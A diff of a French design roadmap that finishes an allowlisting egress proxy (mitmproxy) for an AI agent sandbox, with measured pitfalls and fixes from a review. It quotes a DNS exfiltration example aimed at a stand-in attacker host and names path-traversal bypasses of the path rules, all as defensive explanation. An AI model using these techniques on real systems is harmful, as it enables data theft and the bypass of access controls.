@@ -77,7 +77,7 @@ Le socle d'isolation multi-couches est en place. **« Déployé » ne veut pas d
 │  │   Tout composant qui détient un secret. N'exécute jamais de code       │  │
 │  │   produit par le modèle.                                               │  │
 │  │   • Gateway d'inférence  → provider, clé détenue (fait, Ph. 2)         │  │
-│  │   • Proxy egress L7      → internet, allowlist (Phase 3)               │  │
+│  │   • Proxy egress L7      → internet, allowlist (fait, Ph. 3)           │  │
 │  │   • Broker Kubernetes    → kube-apiserver, jeton RO injecté (Phase 4)  │  │
 │  │   • Broker git           → forge, token injecté (Phase 5)              │  │
 │  └───────────────────────────────────────────────────────────────────────┘  │
@@ -96,6 +96,7 @@ Le proxy L7 est la **brique d'adaptation** : elle permet de déclarer une politi
 6. **Utilisateur harnais** : non-root, home `0750`, linger systemd. Le sudoers scopé (`systemctl restart`) référence une unité qui n'existe qu'à partir de la Phase 8.
 7. **Egress de la zone agent** : filtré par uid (table nftables `agent_egress`, chargée par `agent-egress.service`) — loopback seul, résolution de noms comprise, conteneurs couverts. Appliqué en dernier rôle du play ; voir Phase 1 pour l'ordre et la fenêtre assumée.
 8. **Gateway d'inférence** (`inference-gateway.service`) : porte d'entrée loopback portée par la **zone de confiance** (`broker`), table d'alias obligatoire — l'agent nomme un rôle, jamais un modèle du provider — et clé du provider détenue par le gateway. Le port amont du provider est fermé à la zone agent, donc le gateway est le seul chemin vers un modèle.
+9. **Proxy egress L7** (`egress-proxy.service`, `agent_egress_proxy_enabled`) : la **seule** sortie de la zone agent vers le web, allowlist déclarée par le déploiement, destinations internes refusées, une ligne de journal par requête. Le niveau 1 ne demande aucune CA ; le niveau 2 (interception TLS, opt-in) ajoute les chemins et l'inspection au prix de la distribution d'une CA interne.
 
 ---
 
@@ -108,8 +109,8 @@ Chaque composant est un rôle activable, dans le style existant.
 | Contrôle de l'egress par uid | `agent_egress` | `agent_egress_filter_enabled` | **Socle** |
 | Gateway d'inférence | `inference_gateway` | `inference_gateway_enabled` | **Socle** |
 | Provider d'inférence local (Ollama) | `ollama` *(existant)* | `ollama_enabled` | Optionnel |
-| Proxy egress L7 (niveau 1 : allowlist) | `egress_proxy` | `agent_egress_proxy_enabled` | Brique d'adaptation |
-| Inspection TLS (niveau 2) | `egress_proxy` *(même rôle)* | `agent_egress_proxy_tls_intercept` | Opt-in |
+| Proxy egress L7 (niveau 1 : allowlist) | `agent_egress_proxy` | `agent_egress_proxy_enabled` | Brique d'adaptation |
+| Inspection TLS (niveau 2) | `agent_egress_proxy` *(même rôle)* | `agent_egress_proxy_tls_intercept` | Opt-in |
 | Broker Kubernetes (lecture seule) | `k8s_broker` | `k8s_broker_enabled` | Extension |
 | Broker git (propositions de PR) | `git_broker` | `git_broker_enabled` | Extension |
 | Installation du harnais (provider livré) | `harness_hermes` | `harness_provider: hermes` | Phase 8, **à créer** |
@@ -153,8 +154,10 @@ inference_gateway_debug_logging: false  # flux de débogage, pas une piste d'aud
 
 # --- Proxy egress L7 (brique d'adaptation) ---
 agent_egress_proxy_enabled: false       # false : la zone agent n'a aucun egress web
-agent_egress_proxy_allowlist: []        # domaines autorisés, déclarés par déploiement
-agent_egress_proxy_tls_intercept: false # niveau 2 : inspection (CA interne, opt-in)
+agent_egress_proxy_port: 8080
+# [.]hôte[:port][/chemin] : point initial = sous-domaines, sans port = 80 et 443, chemin = niveau 2.
+agent_egress_proxy_allowlist: []
+agent_egress_proxy_tls_intercept: false # niveau 2 : interception TLS (CA interne, cert pinning cassé)
 
 # --- Extensions optionnelles ---
 k8s_broker_enabled: false
@@ -245,7 +248,7 @@ table inet agent_egress {
 
 **Fenêtre assumée.** Un run qui échoue avant le dernier rôle laisse la zone agent ouverte jusqu'au run suivant — prix de ce choix, retenu parce que le provisioning installe `nvm`/`npm` **en tant que harnais** et a besoin du réseau. La Phase 7 **doit** donc asserter dans `make audit` que la table est chargée, sinon la fenêtre est indétectable.
 
-**Suites.** Phase 3 : le blocage DNS sera remplacé par un **résolveur en zone de confiance limité à l'allowlist du proxy** (proposition de l'utilisateur). Phase 8 : l'unité du harnais devra déclarer `After=agent-egress.service` — la couche `IPAddressDeny` reste utile en complément, elle ne remplace pas ce rôle.
+**Suites.** Phase 3 : le blocage DNS **reste** — le résolveur en zone de confiance annoncé ici ne s'est pas révélé nécessaire, et la raison est écrite au §4. Phase 8 : l'unité du harnais devra déclarer `After=agent-egress.service` — la couche `IPAddressDeny` reste utile en complément, elle ne remplace pas ce rôle.
 
 **Constaté au passage, non traité ici :**
 
@@ -307,33 +310,71 @@ Implémentation : **litellm** (`inference-gateway.service`), HTTP simple sur `12
 
 ### Brique d'adaptation
 
-#### 🌟 Phase 3 — Proxy egress L7
+#### ✅ Phase 3 — Proxy egress L7 *(faite)*
 
 **Pourquoi cette brique dans un projet générique.** On ne peut pas prédire ce dont chaque harnais a besoin. Un broker est spécifique à un cas d'usage (Kubernetes, git) ; un proxy à allowlist configurable est le primitif qui permet à **n'importe quel** déploiement de déclarer sa politique d'egress **sans écrire de code**. C'est ce qui rend le projet capable de protéger des cas d'agent hétérogènes.
 
-**Deux niveaux, activables séparément** — parce que leur coût n'a rien à voir.
+Implémentation : **mitmproxy 12.2.3** (`mitmdump`, mode *regular*), `egress-proxy.service`, HTTP sur `127.0.0.1:8080`, sous l'utilisateur de la zone de confiance. Deux niveaux, activables séparément — leur coût n'a rien à voir :
 
-**Niveau 1 — allowlist de destinations, sans interception TLS** *(défaut quand la brique est activée)*
+| | Niveau 1 — défaut | Niveau 2 — `_tls_intercept: true` |
+|---|---|---|
+| Politique | destination (hôte, port) | destination **et** chemin |
+| TLS | passé à travers, **jamais terminé** | terminé avec une CA interne |
+| CA | **aucune**, rien à distribuer | store système + env Python/Node ; le pinning casse |
+| Journal | destination, décision | idem, plus méthode, chemin, statut |
 
-- Proxy *forward* explicite (CONNECT), allowlist par domaine et port.
-- **Aucune CA interne, aucune distribution de certificat.** Le client est configuré pour utiliser le proxy (`HTTPS_PROXY`, config applicative du harnais).
-- Filtrage au niveau **destination uniquement** : pas de visibilité sur les chemins ni les corps.
-- **Fail-closed obligatoire** : la Phase 1 ne laisse la zone agent sortir que vers le port du proxy. Si le proxy tombe, les clients échouent — ils ne basculent **pas** en direct. C'est cette propriété qui rend un proxy configuré par variable d'environnement acceptable, alors qu'il serait trivialement contournable autrement.
-- Le proxy ne détient **aucun secret** → il peut rester hors de la zone de confiance (règle du §0). Un déploiement sans broker n'a donc que ce composant à ajouter.
+- [x] **Un seul outil pour les deux niveaux** : le même `mitmdump` — `ignore_hosts: .*` pour le niveau 1 (TLS brut), interception au niveau 2. Squid/tinyproxy écartés : ils auraient ajouté un second composant pour le niveau 2.
+- [x] **Refuser les destinations internes** : RFC1918, loopback, lien-local, multicast, CGNAT — pour une **IP littérale comme pour un nom résolu**, la résolution ayant lieu *avant* l'ouverture de la connexion. Un domaine autorisé qui pointerait vers le LAN défairait sinon la Phase 1. Une résolution qui échoue refuse.
+- [x] **Journaliser chaque requête** : une ligne de politique (`egress-allow: hôte:port`, `egress-deny: <raison> hôte:port`) — aucun corps, jamais. La raison distingue `internal`, `not-allowlisted`, `malformed`. C'est la matière de la Phase 7.
+- [x] `agent_egress_proxy_tls_intercept: false` par défaut ; le coût du niveau 2 est dit **avant** de l'activer (README + `all.yml.example`) : CA à distribuer partout, pinning cassé.
+- [x] **Fail-closed vérifié** : proxy arrêté, la zone agent n'a plus **aucun** egress et ne bascule pas en direct.
+- [x] **Zone de confiance, aux deux niveaux** : le proxy tourne sous `broker`, jamais sous l'uid du harnais — pas seulement par la règle du §0, mais parce que le filtre coupe tout egress non-loopback de l'uid du harnais : un proxy sous cet uid ne pourrait pas sortir. La phrase du §3 d'origine (« le niveau 1 peut rester hors zone de confiance ») était donc **fausse**, et activer le proxy implique `trust_zone_enabled`.
+- [x] **Egress du proxy : rien à ajouter à la Phase 1** — confirmé : UFW sort en `ACCEPT` et l'uid de la zone de confiance n'est pas filtré.
+- [ ] Quotas / rate-limits par destination : **écarté**, décision utilisateur — l'alerte sur volume anormal (Phase 7) couvre le cas, et le proxy n'est pas le bon endroit pour tenir un état d'usage.
+- Le proxy **résout lui-même** les noms : la zone agent n'a besoin d'aucun DNS, et son blocage du port 53 reste donc entier.
+- [x] **`*` — « tout l'internet, sauf interne »** : une entrée `*` autorise n'importe quel **hôte public**, sur 80 et 443 (`*:8443` pour un autre port — `*` n'ouvre pas tous les ports). C'est le besoin d'un agent de recherche, qui doit sortir partout mais ne doit pas voir le LAN — et le refus des destinations internes, qui reste, est justement le contrôle qui tient. Ce que ça coûte, et c'est consigné : le contrôle **par destination** disparaît (par construction), et **le canal DNS se rouvre** — chaque nom étant légitime, chaque nom est résolu, alors qu'un nom hors allowlist est refusé aujourd'hui sans jamais être résolu.
 
-**Niveau 2 — inspection et injection (interception TLS)** *(opt-in)*
+**Ce que les mesures ont établi** — les pièges qui ne se voient pas à l'œil nu :
 
-- MITM avec CA interne : visibilité sur les chemins, méthodes et corps. Débloque la politique par chemin, l'injection de credential pour un provider non couvert par un broker, et l'inspection de contenu.
-- **Coût réel, à assumer explicitement** : la CA doit être déployée dans le trust store système **et** dans `certifi` (uv/Python), `NODE_EXTRA_CA_CERTS` (Node), la config git, et le kubeconfig. Les clients qui épinglent un certificat cassent.
-- Le proxy détient alors la clé privée de la CA → **il rejoint la zone de confiance**.
-- **Ne jamais router les jetons des brokers** (k8s, git) à travers ce proxy : ils ont leurs propres exceptions d'egress et leurs propres brokers. Le proxy sert l'egress web générique du harnais.
+| Point | Résultat mesuré |
+|---|---|
+| `@dataclass` dans un script mitmproxy | **Ne fonctionne pas** : le chargeur de scripts n'enregistre pas le module dans `sys.modules`, et `dataclasses._is_type` s'y appuie → `AttributeError` à l'import, service en échec de démarrage. Classe simple. |
+| Journal du service | **Rien n'arrivait dans le journal** alors que le service traitait les requêtes : mitmproxy journalise sur **stdout**, bufferisé en bloc hors terminal. `PYTHONUNBUFFERED=1` dans l'unité — vérifié, les lignes arrivent en temps réel. Sans ça, la piste d'audit de la Phase 7 serait arrivée par paquets et perdue au crash. |
+| Ordre CONNECT ↔ décision | `HttpConnectHook` est émis **avant** la construction de la couche suivante, et une réponse non-2xx coupe le tunnel **sans ouvrir de connexion amont** (vérifié dans la source, puis en 403 réel). Le refus est donc une décision, pas une coupure après coup. |
+| Niveau 1 sans CA | `ignore_hosts: .*` suffit : `openssl s_client -proxy … -connect example.com:443` présente l'**émetteur réel** du site (vérifié), donc aucun certificat à distribuer. La décision d'ignorance lit `context.server.address`, absente sur la connexion cliente initiale : la couche HTTP est bien créée et le CONNECT lu. |
+| Résolution | La zone agent **ne résout plus** (`getent hosts` échoue) et la requête proxifiée aboutit quand même : c'est le proxy qui résout. |
+| Options de script | `opts.set(..., defer=True)` : les `--set` de la CLI sont différés **après** le chargement des scripts, donc une option définie par l'addon est réglable depuis l'unité. |
+| Corps | `stream_large_bodies` n'existe plus en v12 (vérifié par `mitmdump --help`) : les corps ne sont pas retenus, et la borne mémoire est `MemoryMax=` côté systemd. |
+| Accumulation des flux | Mesuré : **1 000 requêtes refusées → +0,6 Mo de RSS** (≈0,6 Ko par flux, 200 req/s). Pas d'accumulation qui condamne un service au long cours ; `MemoryMax` reste la borne. |
+| `is_private` et le CGNAT | **Inerte** pour `100.64.0.0/10` sur l'interpréteur du proxy (3.12.14 : `is_private=False`, comme sur 3.14.4, alors qu'il vaut `True` pour 192.168/16). La plage RFC 6598 est donc nommée explicitement — `is_global` seul ne suffirait pas non plus, il vaut `True` pour le multicast. |
+| Retrait de la CA | `update-ca-certificates` seul **laisse des liens cassés** dans `/etc/ssl/certs` — le lien nommé *et* le lien de hachage (`find /etc/ssl/certs -xtype l`). Le retrait passe donc par `--fresh`, qui reconstruit tout. |
 
-- [ ] **Un seul outil pour les deux niveaux** si possible, pour ne pas multiplier les composants : `mitmproxy` en mode *regular* couvre le niveau 1, le niveau 2 étant le même composant avec interception TLS + addons de politique. Alternative « boring » pour le niveau 1 : `Squid` ou `tinyproxy` (ACL par domaine, pas de MITM natif).
-- [ ] **Refuser les destinations internes** (RFC1918, loopback, link-local) : sinon le proxy devient un chemin vers le LAN et défait la Phase 1.
-- [ ] **Journaliser chaque requête** (destination, statut, taille) → principal artefact de détection d'exfiltration (Phase 7).
-- [ ] Quotas / rate-limits par destination, pour borner un agent en boucle.
-- [ ] `agent_egress_proxy_tls_intercept: false` par défaut, et la documentation doit dire ce que le niveau 2 coûte avant de l'activer.
-- **Egress du proxy : rien à ajouter à la Phase 1.** UFW est en `DEFAULT_OUTPUT_POLICY="ACCEPT"` : l'uid du proxy sort déjà. Le mécanisme d'exception ne sera nécessaire que si la politique sortante globale passe en deny — et il se posera alors dans la table `agent_egress`, à côté du `drop` de la zone agent.
+**Niveau 2, vérifié à son tour.** La CA est générée **au démarrage** du service — pas à la première interception — dans le `confdir` de la zone de confiance : c'est ce qui rend l'ordre du rôle honnête (démarrer, constater la CA, la publier). `update-ca-certificates` la pose dans `/etc/ssl/certs` et les clients l'acceptent **sans `-k`**. Le test qui distingue les deux niveaux est l'émetteur présenté au client : **l'émetteur réel du site** au niveau 1, `CN=mitmproxy` au niveau 2. La clé privée reste en `0600` dans le home de la zone de confiance, illisible par la zone agent. Repasser en niveau 1 **retire la CA du store système mais garde la clé** : la CA reste stable, donc aucune redistribution à chaque bascule.
+
+**Persistance, bascules et réversibilité, vérifiées** : après reboot, les trois services remontent, le proxy écoute sur `127.0.0.1:8080`, le filtre nftables est chargé et l'allowlist s'applique — le port amont du gateway reste fermé. `agent_egress_proxy_enabled: false` retire unité, config, venv, profil **et** la CA, et rend à la zone agent son état de socle (aucun egress, aucune résolution) sans toucher au gateway. Deuxième passage du play : **aucun `changed`** sur le rôle. Repasser du niveau 2 au niveau 1 retire la CA du store et rend l'émetteur réel du site.
+
+**Corrigé après une review externe.** La **résolution DNS avait lieu avant la vérification de l'allowlist** : le proxy résolvait donc tout nom que l'agent lui soumettait, y compris hors allowlist, et lui offrait de ce fait un canal de sortie par les noms de requête (le `curl -x … http://<données>.c2.attacker.com` sortait vraiment, puis se faisait refuser). L'allowlist est désormais évaluée **d'abord et sans toucher au réseau** ; la résolution ne sert plus qu'aux hôtes autorisés, où elle garde son rôle anti-rebinding. Trois corollaires : un nom autorisé mais non résolvable porte la raison `unresolved` (et non `internal`, qui doit rester le signal d'une sonde vers le LAN) ; la correspondance de chemin se fait sur des **frontières de segment** (`/v1` n'autorise plus `/v1-secret` et autorise `/v1` lui-même), et sur le **chemin que l'origine résoudra** : la query string est retirée — `Request.path` la porte, donc `/v1/search?q=1` était refusé à tort — et les segments `.`/`..`, encodés compris, sont résolus, sans quoi `/v1/../admin` franchissait une règle `/v1` pour atteindre `/admin` en amont (résidu : un amont qui décoderait **deux fois**, `%252e%252e`, reste hors de portée) ; et un **pré-vol** valide l'allowlist dans `pre_tasks`, avant la levée du filtre — le rôle échouait sinon au milieu du play, filtre levé (le reste de la fenêtre de la Phase 1 reste ce qu'il était : c'est le `make audit` de la Phase 7 qui la rend détectable).
+
+**Un point de cette review est rejeté, mesure à l'appui :**
+
+| Point | Ce qui a été mesuré |
+|---|---|
+| Conditionner le chown récursif du venv à l'installation (« 20 à 40 s par run ») | **0,65 s** mesurés sur le venv de mitmproxy, 1,21 s pour celui de litellm (≈20 000 fichiers) au même run. Même rejet qu'en Phase 2, et pour la même raison : gater sur la version laisserait un `broker_name` modifié sans accès groupe — panne silencieuse. |
+
+**Risques résiduels, consignés :**
+
+1. **TOCTOU de résolution** : l'addon résout pour contrôler, mitmproxy résout pour connecter. Une réponse DNS qui changerait entre les deux échapperait au contrôle — négligeable dans une sandbox mono-agent, mais c'est écrit.
+2. **Niveau 2 et `certifi`** : les outils qui appellent `certifi.where()` directement ne lisent ni le store système ni `SSL_CERT_FILE`. À traiter avec la Phase 8, sur le venv du harnais.
+3. **Point de panne unique** pour l'egress web : `Restart=always`, et l'absence de repli est la propriété recherchée, pas un défaut.
+4. **`getaddrinfo` bloque la boucle d'événements** le temps d'une résolution, et **le cache par hôte croît avec les hôtes autorisés** : négligeable en allowlist stricte, ~1-2 Mo pour 10 000 domaines sous `*`, et borné par `MemoryMax`. À revoir si mitmproxy expose un jour un hook de résolution.
+5. **La politique est déclarative** : l'agent peut atteindre tout ce que l'allowlist déclare. Un domaine autorisé reste un canal d'exfiltration — c'est la Phase 7 (alerte sur volume) qui porte cette limite, pas le proxy.
+6. **Un conteneur n'atteint le proxy qu'en `--network=host`** : avec son propre netns, `127.0.0.1:8080` est *son* loopback, et le chemin vers l'hôte est un egress non-loopback donc filtré. Le proxy sert le harnais nu ; un conteneur qui a besoin du web passe par `--network=host`.
+
+**Ce qui reste dehors, et pourquoi :**
+
+- **Injection de credential** par le proxy : c'est le patron des brokers (Phase 5), et ce serait un secret de plus à faire vivre. Le proxy sert l'egress web générique.
+- **Inspection de contenu** : le niveau 2 rend les corps visibles, il ne les juge pas. La journalisation ne les enregistre pas — la Phase 7 décidera de ce qui mérite d'être conservé, et où.
+- **Ne jamais router les jetons des brokers** (k8s, git) à travers ce proxy : ils ont leurs propres exceptions d'egress et leurs propres brokers. Le `NO_PROXY` du profil exclut le loopback pour la même raison (le gateway d'inférence n'y passe pas).
 
 ### Extensions optionnelles
 
@@ -431,7 +472,7 @@ server {
 À faire **avant** d'installer le harnais (Phase 8) : rien ne doit tourner sans être audité.
 
 - [ ] Règles auditd `execve` sur l'uid du harnais : rend visible l'exploitation d'une injection en RCE.
-- [ ] Logs des composants de la zone de confiance **et du proxy L7** → cible commune, **non inscriptible par la zone agent**. Principal artefact de détection d'exfiltration — **piste d'audit des prompts comprise**, que le gateway ne fournit pas aujourd'hui (`DETAILED_DEBUG` n'est qu'un flux de débogage, 135 lignes par requête).
+- [ ] Logs des composants de la zone de confiance **et du proxy L7** → cible commune, **non inscriptible par la zone agent**. Principal artefact de détection d'exfiltration — **piste d'audit des prompts comprise**, que le gateway ne fournit pas aujourd'hui (`DETAILED_DEBUG` n'est qu'un flux de débogage, 135 lignes par requête). Le proxy produit déjà sa part (une ligne de politique par requête, `egress-allow`/`egress-deny`) : reste à l'expédier.
 - [ ] Expédition distante des logs (une VM compromise ne doit pas pouvoir effacer ses traces).
 - [ ] Auditer ce que les routes d'admin du gateway exposent à l'agent (`/health`, `/metrics`, `/key/*`) : chemin connu depuis la Phase 2, impact faible sans base de données, mais c'est un chemin que l'agent a.
 - [ ] `make audit` qui **assère** l'état réel : règles d'egress (et **table `agent_egress` chargée** — sans quoi un run interrompu laisse la zone agent ouverte sans le dire), UFW, **`inference-gateway` actif sous l'utilisateur de la zone de confiance**, durcissement des unités, absence de credential hors zone de confiance.
@@ -504,6 +545,7 @@ IPAddressAllow=localhost
 WantedBy=multi-user.target
 ```
 
+- [ ] **Reprendre l'environnement du proxy dans l'unité** : `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` et, au niveau 2, `SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`/`NODE_EXTRA_CA_CERTS`. `/etc/profile.d` n'atteint ni une unité systemd ni une session SSH non interactive (`ssh harnais@vm "curl …"`) — le fichier de profil de `agent_egress_proxy` ne sert qu'aux sessions interactives. À vérifier aussi : que la pile HTTP du harnais honore réellement ces variables.
 - [ ] Mettre à jour le sudoers scopé (`systemctl restart {{ harness_name }}`) : déployé par `harness_user`, il référence une unité qui n'existe qu'à partir d'ici.
 - [ ] `security_hardening` copie les `authorized_keys` de l'admin vers le harnais (même clé pour `ubuntu@` **et** `{{ harness_name }}@`) : rendre ce comportement **optionnel**, et documenter que ça fusionne les identités.
 - [ ] **Vérifier le durcissement obtenu** : `systemd-analyze security {{ harness_name }}.service`, avec un score cible documenté. (C'est le bon endroit pour cette mesure : elle porte sur l'unité créée ici.)
@@ -526,6 +568,7 @@ WantedBy=multi-user.target
 | Écarté | Raison | Condition de retour |
 |---|---|---|
 | Interception TLS (MITM) **par défaut** | Coût de distribution de la CA dans tous les trust stores (système, `certifi`, `NODE_EXTRA_CA_CERTS`, git, kubeconfig) + cert pinning cassé. | **Retenue comme niveau 2 opt-in** (Phase 3), pas comme défaut. Le niveau 1 (allowlist) couvre la majorité des cas. |
+| Résolveur DNS en zone de confiance | Annoncé en Phase 1, il ne sert rien : un client derrière un proxy *forward* envoie le **nom** dans sa requête CONNECT, c'est le proxy qui résout. Et un client qui résoudrait pour se connecter lui-même n'a de toute façon aucune IP hors loopback à joindre — il échouerait après avoir résolu. Un composant de plus pour zéro capacité. | Le jour où un client exigerait une résolution préalable **et** un chemin réseau hors loopback qui ne passe pas par le proxy. |
 | Migration complète UFW → nftables | UFW gère bien l'ingress, est déployé, et fail2ban utilise son action `ufw`. | Jamais nécessaire : les deux coexistent (Phase 1). |
 | Vault / OpenBao / SPIFFE / OIDC apiserver | Se justifie quand il y a des secrets d'infrastructure à protéger. Complexité non testée = risque en soi. | Le jour où un vrai secret entre dans le périmètre. |
 | Kyverno / OPA Gatekeeper côté cluster | En lecture seule, n'apporte rien. | Le jour où l'agent obtient un **verbe d'écriture** (le RBAC ne peut pas inspecter le contenu d'un manifeste : avec `create pods`, un pod `privileged` + `hostPath: /` possède le nœud). |
@@ -566,8 +609,14 @@ ssh {{ harness_name }}@<vm_ip> "podman run --rm alpine wget -T3 -q -O- http://1.
 # Le filtre est-il RÉELLEMENT chargé ? (un run interrompu le laisse levé)
 ssh <admin>@<vm_ip> "sudo nft list table inet agent_egress"
 
-# Via le proxy, une fois la Phase 3 faite
-ssh {{ harness_name }}@<vm_ip> "curl -m 5 -sS -x http://127.0.0.1:<proxy_port> https://<domaine_allowlisté>"
+# Proxy egress L7 (Phase 3) : l'allowlist tient, et le proxy est le SEUL chemin
+ssh {{ harness_name }}@<vm_ip> "curl -m 5 -sS -x http://127.0.0.1:8080 https://<domaine_allowlisté>"
+# Attendu : 200. Hors allowlist ou destination interne : 403 (« CONNECT tunnel failed, response 403 »).
+# Sans proxy, la zone agent ne sort plus et ne résout plus : le proxy est bien le seul chemin.
+ssh {{ harness_name }}@<vm_ip> "curl -m 4 -sS -o /dev/null -w '%{http_code}\n' https://<domaine_allowlisté>"
+ssh {{ harness_name }}@<vm_ip> "getent hosts <domaine_allowlisté> || echo 'pas de résolution'"
+# Le proxy tourne-t-il hors de l'uid du harnais, et que décide-t-il ? (une ligne par requête)
+ssh <admin>@<vm_ip> "systemctl show egress-proxy -p User -p ActiveState; journalctl -u egress-proxy -g 'egress-(allow|deny)' -n 20"
 
 # Durcissement du harnais (après Phase 8)
 systemd-analyze security {{ harness_name }}.service
@@ -581,4 +630,4 @@ tofu -chdir=iac validate && ansible-lint
 
 ### 📌 Point de départ recommandé
 
-**Phases 0, 1 et 2 faites** (documentation corrigée ; egress de la zone agent filtré ; gateway d'inférence en zone de confiance, table d'alias et port amont fermé). Prochaine étape : **Phase 3** (proxy L7, dès qu'un déploiement a besoin d'un egress web déclaré), puis **Phase 7** (observabilité : elle porte la piste d'audit des prompts et l'audit des routes d'admin du gateway). Les **Phases 4 et 5** ne sont à faire que si un cas d'usage le demande, et **Phase 8** une fois le harnais choisi et installable.
+**Phases 0, 1, 2 et 3 faites** (documentation corrigée ; egress de la zone agent filtré ; gateway d'inférence en zone de confiance, table d'alias et port amont fermé ; proxy L7 à allowlist, deux niveaux). Prochaine étape : **Phase 7** (observabilité : elle porte la piste d'audit des prompts, l'audit des routes d'admin du gateway, et la cible commune des journaux du proxy). Les **Phases 4 et 5** ne sont à faire que si un cas d'usage le demande, et **Phase 8** une fois le harnais choisi et installable.
